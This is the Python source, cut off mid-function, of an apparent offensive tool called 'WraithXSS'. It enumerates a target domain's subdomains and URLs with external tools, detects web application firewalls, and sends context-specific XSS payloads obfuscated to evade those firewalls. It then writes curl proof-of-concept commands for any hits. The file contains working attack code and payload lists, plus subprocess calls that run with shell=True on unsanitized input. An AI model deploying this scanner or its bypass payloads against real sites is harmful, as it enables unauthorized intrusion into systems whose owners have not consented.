#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██╗    ██╗██████╗  █████╗ ██╗████████╗██╗  ██╗    ██╗  ██╗███████╗███████╗  ║
║   ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║  ██║    ╚██╗██╔╝██╔════╝██╔════╝  ║
║   ██║ █╗ ██║██████╔╝███████║██║   ██║   ███████║     ╚███╔╝ ███████╗███████╗  ║
║   ██║███╗██║██╔══██╗██╔══██║██║   ██║   ██╔══██║     ██╔██╗ ╚════██║╚════██║  ║
║   ╚███╔███╔╝██║  ██║██║  ██║██║   ██║   ██║  ██║    ██╔╝ ██╗███████║███████║  ║
║    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝  ║
║                                                                               ║
║                           W R A I T H     X S S                               ║
║                                                                               ║
║                    Advanced Auto-Recon & Injection Engine                     ║
║                                                                               ║
║                                                                               ║
║                                                                               ║
Integrated Tools:
- subfinder (Subdomain Discovery)
- httpx (HTTP Probing)
- gau (URL Discovery)
- paramspider (External Parameter Discovery)
- arjun (Hidden Parameter Discovery)
- Built-in Reflection Tester (False Positive Removal)
- Built-in WAF Detector & Bypass Engine
- Built-in Active XSS Injection Tester
- Built-in Parameter Fuzzer

Author: WraithXSS Development Team
Version: 2.0.0
License: MIT
"""

import os
import sys
import subprocess
import argparse
import random
import string
import re
import json
import time
import html
import base64
import urllib.parse
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Set, Dict, Optional, Tuple, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass, field
from enum import Enum

# --- EXTERNAL DEPENDENCY CHECK ---
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("[!] colorama not installed. Run: pip install colorama")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, IntPrompt
    from rich.live import Live
    from rich.layout import Layout
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] rich not installed. Run: pip install rich")
    sys.exit(1)

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize Rich console
console = Console()

# --- CONSTANTS & CONFIGURATION ---
VERSION = "2.0.0"

XSS_PRONE_PARAMS = [
    'q', 'query', 'search', 'keyword', 's', 'term', 'find', 'id', 'page', 'url', 'uri', 
    'link', 'href', 'src', 'redirect', 'redir', 'return', 'returnurl', 'return_url', 
    'returnto', 'next', 'goto', 'continue', 'callback', 'cb', 'jsonp', 'func', 'function',
    'ref', 'referrer', 'referer', 'path', 'file', 'document', 'folder', 'root', 'dir', 
    'load', 'read', 'data', 'input', 'value', 'val', 'var', 'param', 'name', 'username', 
    'user', 'email', 'mail', 'text', 'txt', 'message', 'msg', 'comment', 'body', 'content', 
    'html', 'title', 'subject', 'desc', 'description', 'preview', 'template', 'view', 
    'show', 'display', 'render', 'action', 'do', 'cmd', 'command', 'exec', 'run', 'dest', 
    'destination', 'target', 'to', 'from', 'domain', 'host', 'site', 'server', 'error', 
    'errormsg', 'err', 'exception', 'success', 'successmsg', 'alert', 'warning', 'info', 
    'notice', 'img', 'image', 'pic', 'photo', 'icon', 'avatar', 'logo', 'color', 'bgcolor', 
    'style', 'class', 'width', 'height', 'format', 'type', 'mode', 'lang', 'language', 
    'locale', 'code', 'token', 'key', 'api', 'apikey', 'auth', 'jwt', 'json', 'xml', 
    'yaml', 'csv', 'raw', 'debug', 'test', 'dev', 'admin'
]

# --- EMBEDDED MODULES ---

class ReflectionContext(Enum):
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_ATTRIBUTE_QUOTED = "html_attribute_quoted"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_VAR = "javascript_var"
    URL_CONTEXT = "url_context"
    CSS_CONTEXT = "css_context"
    COMMENT_HTML = "comment_html"
    COMMENT_JS = "comment_js"
    NO_REFLECTION = "no_reflection"
    FILTERED = "filtered"

@dataclass
class ReflectionResult:
    url: str
    parameter: str
    reflects: bool
    context: ReflectionContext
    reflection_count: int
    filtered_chars: List[str]
    confidence: float

class WAFType(Enum):
    CLOUDFLARE = "Cloudflare"
    AKAMAI = "Akamai"
    AWS_WAF = "AWS WAF"
    AZURE_WAF = "Azure WAF"
    IMPERVA = "Imperva/Incapsula"
    SUCURI = "Sucuri"
    MODSECURITY = "ModSecurity"
    F5_BIG_IP = "F5 BIG-IP"
    WORDFENCE = "Wordfence"
    GENERIC = "Generic WAF"
    NONE = "No WAF Detected"
    UNKNOWN = "Unknown"

@dataclass
class WAFResult:
    detected: bool
    waf_type: WAFType
    confidence: float
    bypass_recommendations: List[str]

class InjectionResult(Enum):
    REFLECTED = "reflected"
    EXECUTED = "executed"
    BLOCKED = "blocked"
    FILTERED = "filtered"
    ERROR = "error"

# --- ELITE SPECTER MODULES ---

class PolymorphicEngine:
    """Generates evasive, polymorphic versions of payloads to bypass WAFs."""
    @staticmethod
    def obfuscate(payload: str) -> str:
        # 1. Randomized Case
        payload = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        # 2. Hex Encoding for vulnerable characters (<, >, ")
        to_hex = {'<': '&#x3c;', '>': '&#x3e;', '"': '&#x22;', "'": '&#x27;'}
        if random.random() > 0.7:
            for char, hex_val in to_hex.items():
                payload = payload.replace(char, hex_val)
        # 3. Null-byte injection
        if random.random() > 0.8:
            payload = payload.replace('<', '<%00')
        return payload

@dataclass
class XSSTestResult:
    url: str
    parameter: str
    payload: str
    result: InjectionResult
    response_code: int
    reflected: bool
    bypass_used: Optional[str]
    evidence: str
    severity: str
    confidence: float
    poc_curl: str = ""

# --- CORE LOGIC CLASSES ---

class ReflectionTester:
    XSS_CHARS = ['<', '>', '"', "'", '/', '\\', '(', ')', ';', '=', '`']
    
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
    def test_reflection(self, url: str, parameter: str) -> ReflectionResult:
        canary = "xss" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[parameter] = [canary]
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(params, doseq=True), parsed.fragment))
        
        try:
            resp = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=True)
            if canary not in resp.text:
                return ReflectionResult(url, parameter, False, ReflectionContext.NO_REFLECTION, 0, [], 0.0)
            
            context = self._detect_context(resp.text, canary)
            filtered = self._test_filtering(url, parameter)
            confidence = self._calc_confidence(context, filtered)
            return ReflectionResult(url, parameter, True, context, resp.text.count(canary), filtered, confidence)
        except:
            return ReflectionResult(url, parameter, False, ReflectionContext.NO_REFLECTION, 0, [], 0.0)

    def _detect_context(self, body, canary):
        idx = body.find(canary)
        context_str = body[max(0, idx-500):min(len(body), idx+len(canary)+500)]
        if re.search(r'<script[^>]*>.*?' + re.escape(canary), context_str, re.I | re.S):
            return ReflectionContext.JAVASCRIPT_STRING if re.search(r'["\'].*?' + re.escape(canary), context_str) else ReflectionContext.JAVASCRIPT_VAR
        if re.search(r'<\w+[^>]+\w+\s*=\s*(["\']?)[^>]*?' + re.escape(canary), context_str, re.I):
            return ReflectionContext.HTML_ATTRIBUTE_QUOTED
        return ReflectionContext.HTML_BODY

    def _test_filtering(self, url, parameter):
        filtered = []
        for char in self.XSS_CHARS:
            canary = "x" + "".join(random.choices(string.ascii_lowercase, k=4))
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [f"{canary}{char}{canary}"]
            try:
                r = self.session.get(urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(params, doseq=True), parsed.fragment)), timeout=5, verify=False)
                if f"{canary}{char}{canary}" not in r.text: filtered.append(char)
            except: pass
        return filtered

    def _calc_confidence(self, context, filtered):
        score = 0.9 if context == ReflectionContext.HTML_BODY else 0.7
        score -= (len([c for c in filtered if c in ['<','>','"',"'"]]) * 0.15)
        return max(0.0, score)

class WAFDetector:
    SIGNATURES = {
        WAFType.CLOUDFLARE: {'h': ['cf-ray', 'cf-request-id', '__cfduid'], 's': ['cloudflare'], 'b': ['cloudflare', 'attention required']},
        WAFType.AKAMAI: {'h': ['x-akamai-request-id', 'akamai-grn'], 's': ['akamai']},
        WAFType.AWS_WAF: {'h': ['x-amzn-requestid', 'x-amz-cf-id'], 'b': ['aws', 'request blocked']},
        WAFType.IMPERVA: {'h': ['x-iinfo', 'incap_ses', 'visid_incap'], 's': ['incapsula', 'imperva']},
        WAFType.MODSECURITY: {'b': ['modsecurity', 'mod_security', 'naxsi']},
        WAFType.SUCURI: {'h': ['x-sucuri-id', 'x-sucuri-cache'], 's': ['sucuri']},
        WAFType.WORDFENCE: {'b': ['wordfence', 'generated by wordfence']},
        WAFType.F5_BIG_IP: {'h': ['x-cprealm', 'x-wa-info'], 's': ['big-ip', 'f5']},
    }
    
    def detect(self, url: str) -> WAFResult:
        try:
            s = requests.Session()
            r1 = s.get(url, timeout=10, verify=False)
            r2 = s.get(f"{url}?t=<script>alert(1)</script>'", timeout=10, verify=False)
            headers = {**r1.headers, **r2.headers}
            for wtype, sigs in self.SIGNATURES.items():
                if any(h.lower() in str(headers).lower() for h in sigs.get('h', [])) or \
                   any(s.lower() in headers.get('Server', '').lower() for s in sigs.get('s', [])) or \
                   any(b.lower() in r2.text.lower() for b in sigs.get('b', [])):
                    return WAFResult(True, wtype, 0.9, ["Use encoding", "Try SVG", "Case variation"])
            return WAFResult(False, WAFType.NONE, 1.0, [])
        except: return WAFResult(False, WAFType.UNKNOWN, 0.0, [])

    CONTEXT_PAYLOADS = {
        ReflectionContext.HTML_BODY: [
            '<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
            '<details open ontoggle=alert(1)>', '<ScRiPt>alert(1)</ScRiPt>', '<svg/onload=alert`1`>'
        ],
        ReflectionContext.HTML_ATTRIBUTE_QUOTED: [
            '"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 
            '\'><svg onload=alert(1)>', '" onmouseover="alert(1)', '" autofocus onfocus="alert(1)'
        ],
        ReflectionContext.JAVASCRIPT_STRING: [
            '\';alert(1)//', '";alert(1)//', '-alert(1)-', '`+alert(1)+`'
        ],
        ReflectionContext.JAVASCRIPT_VAR: [
            ';alert(1)//', '1;alert(1)', 'alert(1)'
        ]
    }
    
    # Global fallback for unknown contexts
    GENERIC_PAYLOADS = [
        '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 
        'javascript:alert(1)', '<svg/onload=alert(1)>',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
        '<details open ontoggle=alert(1)>'
    ]

    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

    def test_xss(self, url: str, parameter: str, context: ReflectionContext = ReflectionContext.HTML_BODY) -> List[XSSTestResult]:
        """Neural Overdrive: Multi-stage precision XSS testing with zero false-positive logic."""
        results = []
        
        # STAGE 1: Canary Reflection & Filter Analysis
        canary = "xss" + "".join(random.choices(string.ascii_lowercase, k=6))
        # Test required characters for the context
        req_chars = ['<', '>'] if context == ReflectionContext.HTML_BODY else ['"', "'"]
        test_string = canary + "".join(req_chars)
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[parameter] = [test_string]
        verify_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(params, doseq=True), parsed.fragment))
        
        try:
            v_resp = self.session.get(verify_url, timeout=self.timeout, verify=False)
            if test_string not in v_resp.text:
                # If required chars are filtered, we don't proceed with noisy payloads
                return []
        except: return []

        # STAGE 2: Precision Payload Deployment
        payloads = self.CONTEXT_PAYLOADS.get(context, self.GENERIC_PAYLOADS)
        if payloads != self.GENERIC_PAYLOADS:
            payloads = payloads + [p for p in self.GENERIC_PAYLOADS if p not in payloads]

        for payload in payloads:
            # Neural Overdrive: Polymorphic Bypass
            if random.random() > 0.4:
                payload = PolymorphicEngine.obfuscate(payload)
                
            params[parameter] = [payload]
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(params, doseq=True), parsed.fragment))
            try:
                resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                # Verify exact payload execution or unquoted reflection
                if payload in resp.text or urllib.parse.unquote(payload) in resp.text:
                    if resp.status_code not in [403, 406]:
                        # Generate Auto-POC
                        poc = f"curl -i -s -k '{test_url}'"
                        results.append(XSSTestResult(
                            url=test_url, 
                            parameter=parameter, 
                            payload=payload, 
                            result=InjectionResult.EXECUTED, 
                            response_code=resp.status_code, 
                            reflected=True, 
                            bypass_used=None, 
                            evidence=f"Confirmed execution in {context.value}", 
                            severity="CRITICAL",
                            confidence=1.0,
                            poc_curl=poc
                        ))
                        break # Only need one confirmed hit per param
            except: pass
        return results

# --- MAIN ENGINE ---

class XSSParamHunter:
    def __init__(self, args):
        self.domain = args.domain
        self.output_dir = Path(args.output) if args.output else Path(f"output/{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.threads = args.threads
        self.timeout = args.timeout
        self.deep = args.deep
        self.fuzz = args.fuzz
        
        # Files
        self.subdomains_file = self.output_dir / "subdomains.txt"
        self.live_hosts_file = self.output_dir / "live_hosts.txt"
        self.all_urls_file = self.output_dir / "all_urls.txt"
        self.report_file = self.output_dir / "report.html"
        
        # Data
        self.subdomains = {self.domain}
        self.live_hosts = set()
        self.urls = set()
        self.reflections = []
        self.exploits = []
        self.waf_info = WAFResult(False, WAFType.NONE, 0.0, [])
        self.start_time = datetime.now()
        self.webhooks = {"discord": None, "slack": None}
        self.profile_file = self.output_dir / f"{self.domain}.specter"


    def _ensure_output_dir(self):
        """Ensure the output directory exists before writing."""
        if not self.output_dir.exists():
            self.output_dir.mkdir(parents=True, exist_ok=True)

    def reconfigure_target(self):
        """Reconfigure the target domain and reset session buffers."""
        new_domain = Prompt.ask("[bold cyan]Enter new target domain (e.g., example.com)[/bold cyan]")
        if not new_domain: return
        
        self.domain = new_domain
        self.output_dir = Path(f"output/{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Reset Session Buffers
        self.subdomains = {self.domain}
        self.live_hosts = set()
        self.urls = set()
        self.reflections = []
        self.exploits = []
        self.waf_info = WAFResult(False, WAFType.NONE, 0.0, [])
        self.start_time = datetime.now()
        
        # Re-initialize File Paths
        self.subdomains_file = self.output_dir / "subdomains.txt"
        self.live_hosts_file = self.output_dir / "live_hosts.txt"
        self.all_urls_file = self.output_dir / "all_urls.txt"
        self.report_file = self.output_dir / "report.html"
        self.profile_file = self.output_dir / f"{self.domain}.specter"
        
        console.print(f"\n[bold green]⚛ MISSION RECONFIGURED: Now attacking {self.domain} ⚛[/]")
        console.print(f"[dim]New Neural Profile established at: {self.output_dir}[/dim]\n")
        time.sleep(1)

    def save_profile(self):
        """Save the current state to a Specter Intelligence profile."""
        data = {
            "domain": self.domain,
            "version": VERSION,
            "subdomains": list(self.subdomains),
            "live_hosts": list(self.live_hosts),
            "urls": list(self.urls),
            "reflections": [
                {
                    "url": r.url, "parameter": r.parameter, "context": r.context.value,
                    "count": r.reflection_count, "filtered": r.filtered_chars, "confidence": r.confidence
                } for r in self.reflections
            ],
            "exploits": self.exploits,
            "timestamp": datetime.now().isoformat()
        }
        self._ensure_output_dir()
        with open(self.profile_file, 'w') as f:
            json.dump(data, f, indent=4)
        console.print(f"[bold green]⚛ SPECTER INTELLIGENCE: Profile synchronized at {self.profile_file}[/]")

    def load_profile(self):
        """Load state from a Specter Intelligence profile."""
        if not self.profile_file.exists():
            console.print("[bold red]✖ FAIL: No Specter profile found for this domain.[/]")
            return False
            
        with open(self.profile_file, 'r') as f:
            data = json.load(f)
            self.subdomains = set(data.get("subdomains", []))
            self.live_hosts = set(data.get("live_hosts", []))
            self.urls = set(data.get("urls", []))
            self.exploits = data.get("exploits", [])
            # Reconstruct reflections
            for r in data.get("reflections", []):
                self.reflections.append(ReflectionResult(
                    r["url"], r["parameter"], True, ReflectionContext(r["context"]), 
                    r["count"], r["filtered"], r["confidence"]
                ))
        console.print(f"[bold green]⚛ SPECTER INTELLIGENCE: Neural state restored from profile.[/]")
        return True

    def send_webhook(self, message):
        """Send notifications to Discord or Slack."""
        for platform, url in self.webhooks.items():
            if url:
                try:
                    payload = {"content" if platform == "discord" else "text": f"☢ **WraithXSS Alert** ☢\n{message}"}
                    requests.post(url, json=payload, timeout=5)
                except Exception: pass

    def boot_animation(self):
        """Cinematic startup sequence with glitched text and neural handshakes."""
        boot_steps = [
            ("Initializing Neural Core...", "green"),
            ("Establishing Secure Tunnel [Proxy: ON]", "cyan"),
            ("Loading XSS Injection Payloads...", "yellow"),
            ("Synchronizing with AlienVault OTX...", "magenta"),
            ("Decrypting WAF Signatures...", "red"),
            ("SYSTEM BREACH SIMULATION: SUCCESS", "bold green")
        ]
        
        with Live(console=console, refresh_per_second=10) as live:
            for step, color in boot_steps:
                for i in range(1, 11):
                    glitch = "".join(random.choices(string.ascii_letters + string.punctuation, k=5))
                    prog = "█" * i + "░" * (10-i)
                    live.update(Panel(f"[{color}]{step} [bold white]{prog}[/] [dim]({glitch})[/]", border_style="bold blue"))
                    time.sleep(0.1)
        time.sleep(0.5)

    def print_banner(self):
        """Print a hyper-stylized 'Elite' hacker banner with gradient effects."""
        colors = ["bold magenta", "bold purple", "bold blue", "bold cyan", "bold white"]
        banner_lines = [
            "    ██╗    ██╗██████╗  █████╗ ██╗████████╗██╗  ██╗    ██╗  ██╗███████╗███████╗",
            "    ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║  ██║    ╚██╗██╔╝██╔════╝██╔════╝",
            "    ██║ █╗ ██║██████╔╝███████║██║   ██║   ███████║     ╚███╔╝ ███████╗███████╗",
            "    ██║███╗██║██╔══██╗██╔══██║██║   ██║   ██╔══██║     ██╔██╗ ╚════██║╚════██║",
            "    ╚███╔███╔╝██║  ██║██║  ██║██║   ██║   ██║  ██║    ██╔╝ ██╗███████║███████║",
            "     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝"
        ]
        
        for i, line in enumerate(banner_lines):
            color = colors[i % len(colors)]
            console.print(f"[{color}]{line}[/]")
            time.sleep(0.04)
            
        console.print(f"\n[bold magenta]                ⚛ THE ULTIMATE ALL-IN-ONE WRAITHXSS v{VERSION} ⚛[/bold magenta]")
        console.print(f"[bold dim]            Advanced Recon • Neural Analysis • Context-Aware Exploitation[/bold dim]")
        console.print(f"[bold cyan]    {'=' * 80}[/bold cyan]\n")
        
        info_table = Table(box=None, padding=(0, 2))
        info_table.add_column("TARGET DOMAIN", style="bold cyan")
        info_table.add_column("NEURAL THREADS", style="bold green")
        info_table.add_column("SCAN ENGINE", style="bold yellow")
        info_table.add_column("BOOT TIME", style="bold magenta")
        
        mode = "SPECTER (AUTOMATED)" if self.deep else "PHANTOM (FAST)"
        if self.fuzz: mode += " + NEURAL FUZZ"
        
        info_table.add_row(
            self.domain.upper(), 
            str(self.threads), 
            mode, 
            self.start_time.strftime("%H:%M:%S")
        )
        
        console.print(Panel(info_table, border_style="bold blue", title="[bold white]⚛ SYSTEM STATUS ⚛[/bold white]"))
        time.sleep(0.4)

    def print_mission(self, tool_name, mission):
        """Print a perfectly aligned hyper-stylized mission header with scanning effect."""
        width = 80
        # Use more exotic box characters
        header = f"[bold cyan]◈{"─" * (width-2)}◈[/bold cyan]"
        
        # Title Line with dynamic icon
        title_text = f" ⚡ MISSION COMPONENT: [bold white]{tool_name.upper()}[/]"
        title_line = f"[bold cyan]│[/bold cyan]{title_text.ljust(width-2+12)}[bold cyan]│[/bold cyan]"
        
        # Objective Line
        desc_text = f" ▹ Objective: {mission}"
        if len(desc_text) > width - 4:
            desc_text = desc_text[:width-7] + "..."
        desc_line = f"[bold cyan]│[/bold cyan][dim white]{desc_text.ljust(width-2)}[/dim white][bold cyan]│[/bold cyan]"
        
        footer = f"[bold cyan]◈{"─" * (width-2)}◈[/bold cyan]"
        
        console.print(f"\n{header}")
        console.print(title_line)
        console.print(desc_line)
        console.print(footer)

    def print_status(self, tool_name, result_text, file_name=None):
        """Print a hyper-stylized 'Neural Fragment' status panel."""
        table = Table(box=None, padding=(0, 1), show_header=False)
        table.add_row("[bold cyan]TYPE[/bold cyan]", f"[bold white]0x{random.randint(100, 999):X}_SIGNAL[/bold white]")
        table.add_row("[bold cyan]LOAD[/bold cyan]", "[bold green]STAT: NOMINAL[/bold green]")
        table.add_row("[bold cyan]CORE[/bold cyan]", f"[bold white]{tool_name}[/bold white]")
        table.add_row("[bold cyan]DATA[/bold cyan]", f"[bold yellow]{result_text}[/bold yellow]")
        if file_name:
            table.add_row("[bold cyan]ARCHIVE[/bold cyan]", f"[bold blue]vault://{file_name}[/bold blue]")
        
        console.print(Panel(table, border_style="bold cyan", expand=False, title="[bold white]⚛ INTEL SYNTHESIS ⚛[/bold white]", subtitle="[dim white]V2.0_OVERDRIVE[/dim white]"))

    def prompt_and_save(self, data: Set[str], filename: str, description: str):
        """Helper to ask user for confirmation before saving a specific result set via Neural Save Protocol."""
        if not data: return
            
        width = 80
        save_panel = Table(box=None, expand=True, show_header=False)
        save_panel.add_row(f"[bold cyan]PROTOCOL[/bold cyan]", f"[bold white]0x{random.randint(100, 999):X}_SAVE[/bold white]")
        save_panel.add_row(f"[bold cyan]RESOURCE[/bold cyan]", f"[bold yellow]{len(data)} {description.upper()}[/bold yellow]")
        save_panel.add_row(f"[bold cyan]TARGET  [/bold cyan]", f"[bold blue]{filename}[/bold blue]")
        
        console.print(Panel(save_panel, border_style="bold magenta", title="[bold white]⚛ NEURAL SAVE PROTOCOL ⚛[/bold white]", width=width))
        confirm = Prompt.ask("[bold cyan]Execute disk-write sequence?[/bold cyan]", choices=["y", "n"], default="y")
        
        if confirm.lower() == 'y':
            filepath = self.output_dir / filename
            self._ensure_output_dir()
            with open(filepath, 'w') as f:
                f.write('\n'.join(sorted(data)))
            self.print_status("Neural Vault", f"Data secured in {filename}", filename)
        else:
            console.print("[dim]◬ Operation aborted. Data remains in neural buffer.[/dim]")

    def run_tool(self, cmd, desc):
        """Run a tool with a high-tech progress indicator."""
        with Progress(
            SpinnerColumn("line"),
            TextColumn("[bold cyan]⧯ {task.description}[/bold cyan]"),
            console=console,
            transient=True
        ) as progress:
            progress.add_task(description=f"DEPLOYING: {desc}", total=None)
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.stdout
            except Exception as e:
                console.print(f"[bold red]✖ FAIL:[/bold red] Error running {desc}: {e}")
                return ""

    def run_specter_module(self, tool_name, mission, cmd_callback, progress_total=100, automated_log=None):
        """Execute a tool module with a persistent 'Neural Matrix' interface. Supports automated logging."""
        if automated_log:
            automated_log(f"Initiating {tool_name} mission protocols...", "cyan")
            return cmd_callback(automated_log, None, None)

        self.print_mission(tool_name, mission)
        
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="main_area", ratio=1),
            Layout(name="footer", size=5)
        )
        
        pulse_log = Table(box=None, expand=True, show_header=False)
        pulse_log.add_column("STREAM", style="bold white")
        
        progress = Progress(
            SpinnerColumn("dots12"),
            TextColumn("[bold cyan]◬ {task.description}[/]"),
            BarColumn(bar_width=40, style="dim white", complete_style="bold cyan", finished_style="bold green"),
            TextColumn("[bold magenta]{task.percentage:>3.0f}%[/]"),
            console=console,
            transient=False
        )
        
        task_id = progress.add_task(f"SYNCING: {tool_name}", total=progress_total)
        
        layout["header"].update(Panel(f"[bold magenta]⚛ NEURAL MATRIX INTERFACE: {tool_name.upper()} ⚛[/]", border_style="bold blue"))
        layout["main_area"].update(Panel(pulse_log, title="[bold white]LOGIC STREAM[/]", border_style="bold cyan"))
        layout["footer"].update(Panel(progress, border_style="bold cyan", title="[bold white]ENCRYPTION STATUS[/]"))

        with Live(layout, refresh_per_second=10, transient=False):
            def log_pulse(msg, color="white", advance=0):
                hex_offset = f"0x{random.randint(0x1000, 0xFFFF):X}"
                pulse_log.add_row(f"[dim]{hex_offset}[/] [{color}]⟫ {msg}[/]")
                if len(pulse_log.rows) > 12: pulse_log.rows.pop(0)
                if advance and progress: progress.advance(task_id, advance)
                time.sleep(0.18)

            log_pulse(f"Initializing {tool_name} mission protocols...", "cyan", advance=2)
            log_pulse("Mapping target neural topology...", "magenta", advance=3)
            
            result = cmd_callback(log_pulse, progress, task_id)
            
            progress.update(task_id, completed=progress_total)
            log_pulse(f"{tool_name} sequence complete. Neural handshake terminated.", "bold green")
            time.sleep(0.5)
            return result

    def preview_results(self, title, items, limit=10):
        """Display a perfectly aligned 'Neural Matrix' preview of discovered items."""
        if not items: return
        
        icon = "🔍" if "Subdomains" in title else "📡" if "Hosts" in title else "📦"
        
        # ELITE MATRIX DESIGN
        table = Table(
            box=None, 
            expand=True, 
            header_style="bold cyan",
            border_style="dim cyan",
            padding=(0, 2)
        )
        table.add_column("NODE_ID", style="bold magenta", justify="center", width=10)
        table.add_column("NEURAL_DATA_PATH", style="bold white", justify="left")
        
        for i, item in enumerate(list(items)[:limit], 1):
            table.add_row(f"0x{i:04X}", str(item))
            
        header_text = f" 🧬 NEURAL SYNTHESIS: [bold white]{title.upper()}[/] "
        
        # Aligned Decorative Frame
        width = 80
        console.print(f"\n[bold cyan]╭{"─" * (width-2)}╮[/bold cyan]")
        console.print(f"[bold cyan]│[/bold cyan] [bold cyan]{header_text.center(width-6)}[/][bold cyan]│[/bold cyan]")
        console.print(f"[bold cyan]├{"─" * (width-2)}┤[/bold cyan]")
        console.print(table)
        
        if len(items) > limit:
            more_msg = f"... and {len(items) - limit} additional nodes secured in neural buffer ..."
            console.print(f"[bold cyan]│[/bold cyan] [dim white]{more_msg.center(width-6)}[/dim white] [bold cyan]│[/bold cyan]")
            
        console.print(f"[bold cyan]╰{"─" * (width-2)}╯[/bold cyan]\n")

    def run_subfinder(self):
        """Run Subfinder for subdomain discovery with Neural Logic."""
        def subfinder_task(log, progress, tid):
            log("Querying passive DNS archives and neural data-leaks...", "yellow", advance=10)
            log("Parsing root-zone infrastructure for horizontal expansion...", "cyan", advance=10)
            out = self.run_tool(f"subfinder -d {self.domain} -silent", "Subdomain Enumeration")
            sub_list = [line.strip() for line in out.split('\n') if line.strip()]
            self.subdomains.update(sub_list)
            log(f"Phase 1 Complete: {len(sub_list)} nodes extracted from DNS mesh.", "green", advance=70)
            return sub_list

        sub_list = self.run_specter_module("Subdomain Discovery", "Mapping infrastructure layers", subfinder_task)
        self.preview_results("Subdomains", sub_list)
        self.print_status("SUBFINDER", f"Found {len(self.subdomains)} total nodes")
        self.prompt_and_save(self.subdomains, "subdomains.txt", "subdomains")

    def run_httpx(self):
        """Run HTTPX for live host probing with Neural Logic."""
        def httpx_task(log, progress, tid):
            if not self.subdomains: self.subdomains.add(self.domain)
            log(f"Probing {len(self.subdomains)} global assets for protocol handshakes...", "yellow", advance=5)
            log("Analyzing server fingerpints and SSL/TLS certificates...", "cyan", advance=10)
            self._ensure_output_dir()
            with open(self.subdomains_file, 'w') as f: f.write('\n'.join(self.subdomains))
            out = self.run_tool(f"cat {self.subdomains_file} | httpx -silent", "Host Probing")
            host_list = [line.strip() for line in out.split('\n') if line.strip()]
            self.live_hosts.update(host_list)
            log(f"Phase 2 Complete: {len(host_list)} assets responding to neural ping.", "green", advance=75)
            return host_list

        host_list = self.run_specter_module("Host Verification", "Live service validation", httpx_task)
        self.preview_results("Live Hosts", host_list)
        self.print_status("HTTPX", f"Acquired {len(self.live_hosts)} active service nodes")
        self.prompt_and_save(self.live_hosts, "live_hosts.txt", "live hosts")

    def run_gau(self):
        """Run GAU for URL harvesting with Neural Logic."""
        def gau_task(log, progress, tid):
            log(f"Mining historical URL fragments from Wayback and OTX neural archives...", "yellow", advance=10)
            log("Deduplicating archaic parameters for high-entropy vectors...", "cyan", advance=10)
            out = self.run_tool(f"gau {self.domain} --threads {self.threads}", "URL Harvesting")
            url_list = [line.strip() for line in out.split('\n') if '?' in line]
            self.urls.update(url_list)
            log(f"Phase 3 Complete: {len(url_list)} prone historical vectors secured.", "green", advance=70)
            return url_list

        url_list = self.run_specter_module("Asset Harvesting", "Public archive reconnaissance", gau_task)
        self.preview_results("Historical URLs", url_list)
        self.print_status("GAU", f"Harvested {len(url_list)} prone historical vectors")
        self.prompt_and_save(set(url_list), "gau_urls.txt", "historical URLs")

    def run_paramspider(self):
        """Run ParamSpider for parameter mining with Neural Logic."""
        def ps_task(log, progress, tid):
            log("Crawling target surface and parsing DOM fragments for injection points...", "yellow", advance=15)
            log("Identifying vulnerable JavaScript sources and sinks...", "cyan", advance=15)
            self._ensure_output_dir()
            self.run_tool(f"paramspider -d {self.domain} -o {self.output_dir}/paramspider.txt", "DOM Parameter Mining")
            ps_file = self.output_dir / "paramspider.txt"
            new_urls = []
            if ps_file.exists():
                with open(ps_file) as f: 
                    new_urls = [l.strip() for l in f if '?' in l]
